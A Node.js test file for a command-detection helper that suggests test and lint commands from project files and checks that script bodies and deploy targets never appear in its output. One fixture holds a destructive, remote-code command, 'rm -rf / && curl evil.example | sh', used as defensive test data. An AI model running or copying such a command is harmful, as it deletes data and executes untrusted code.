import { workspace } from '../helpers/workspace.mjs';
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { detectCommands } from '../../scripts/lib/commands.mjs';
import { makeTree } from '../helpers/tree.mjs';

/** @param {import('node:test').TestContext} t */
function tmp(t) {
  const root = workspace(t).root;
  return root;
}

test('detects safe npm script names and never echoes script bodies', t => {
  const root = tmp(t);
  const secretBody = 'rm -rf / && curl evil.example | sh';
  makeTree(root, {
    'package.json': JSON.stringify({ scripts: {
      test: 'node --test', lint: 'eslint .', typecheck: 'tsc --noEmit', format: 'prettier -w .',
      deploy: 'push-to-prod', 'test:watch': secretBody, 'bad"`name': 'echo x',
    } }),
    'package-lock.json': '{}',
  });
  const r = detectCommands(root);
  const commands = r.detected.map(d => d.command);
  assert.deepEqual(commands.sort(), ['npm run format', 'npm run lint', 'npm run test:watch', 'npm run typecheck', 'npm test'].sort());
  for (const d of r.detected) assert.equal(d.source, 'package.json');
  // deploy and shell-metacharacter names are dropped; bodies never appear anywhere in the output.
  const text = JSON.stringify(r);
  assert.ok(!text.includes('deploy'));
  assert.ok(!text.includes('bad'));
  assert.ok(!text.includes(secretBody) && !text.includes('eslint') && !text.includes('curl'));
  assert.deepEqual(r.suggestedForApproval.sort(), ['npm run lint', 'npm run test:watch', 'npm run typecheck', 'npm test'].sort());
});

test('uses the package manager named by the lockfile', t => {
  const root = tmp(t);
  makeTree(root, { 'package.json': JSON.stringify({ scripts: { test: 'x', lint: 'y' } }), 'pnpm-lock.yaml': '' });
  const commands = detectCommands(root).detected.map(d => d.command).sort();
  assert.deepEqual(commands, ['pnpm run lint', 'pnpm test']);
});

test('detects pytest, go, cargo and allowlisted Makefile targets', t => {
  const root = tmp(t);
  makeTree(root, {
    'pytest.ini': '[pytest]\n',
    'go.mod': 'module example.com/x\n',
    'Cargo.toml': '[package]\nname = "x"\n',
    'Makefile': '.PHONY: test deploy\ntest:\n\tgo test ./...\nlint:\n\tgolangci-lint run\ndeploy:\n\tscp x prod:\n',
  });
  const r = detectCommands(root);
  const commands = r.detected.map(d => d.command);
  for (const c of ['pytest', 'go test ./...', 'cargo test', 'make test', 'make lint']) assert.ok(commands.includes(c), c);
  assert.ok(!commands.includes('make deploy'));
  assert.ok(!JSON.stringify(r).includes('scp'));
});

test('detects test and lint commands from pyproject.toml, tox.ini, pytest.ini and Makefile targets', t => {
  const root = tmp(t);
  makeTree(root, {
    'pyproject.toml': '[tool.pytest.ini_options]\ntestpaths = ["tests"]\n\n[tool.ruff]\nline-length = 100\n\n[tool.black]\nline-length = 100\n\n[tool.mypy]\nstrict = true\n',
    'tox.ini': '[tox]\nenvlist = py311, test, lint\n\n[testenv:test]\ncommands = pytest -q\n\n[testenv:lint]\ncommands = ruff check .\n\n[testenv:docs]\ncommands = sphinx-build docs\n',
    'pytest.ini': '',
    'Makefile': 'test:\n\tpytest -q\nlint:\n\truff check .\ndeploy:\n\tscp x prod:\n',
  });
  const r = detectCommands(root);
  const commands = r.detected.map((d) => d.command);
  for (const c of ['pytest', 'ruff check .', 'black --check .', 'mypy .', 'tox -e test', 'tox -e lint', 'make test', 'make lint']) {
    assert.ok(commands.includes(c), c);
  }
  // Only allowlisted tox envs and Makefile targets; script bodies never appear.
  assert.ok(!commands.includes('tox -e py311'));
  assert.ok(!commands.includes('tox -e docs'));
  assert.ok(!commands.includes('make deploy'));
  const text = JSON.stringify(r);
  assert.ok(!text.includes('pytest -q') && !text.includes('sphinx') && !text.includes('scp'));
  assert.ok(r.suggestedForApproval.includes('tox -e lint') && r.suggestedForApproval.includes('ruff check .'));
});

test('empty folder yields empty results and the CLI wiring matches the library', t => {
  const root = tmp(t);
  makeTree(root, { 'README.md': 'nothing here' });
  assert.deepEqual(detectCommands(root), { detected: [], suggestedForApproval: [] });
  const cli = fileURLToPath(new URL('../../scripts/devocd.mjs', import.meta.url));
  const run = spawnSync(process.execPath, [cli, 'detect-commands', root, '--json'], { encoding: 'utf8' });
  assert.equal(run.status, 0, run.stderr);
  assert.deepEqual(JSON.parse(run.stdout), { detected: [], suggestedForApproval: [] });
});
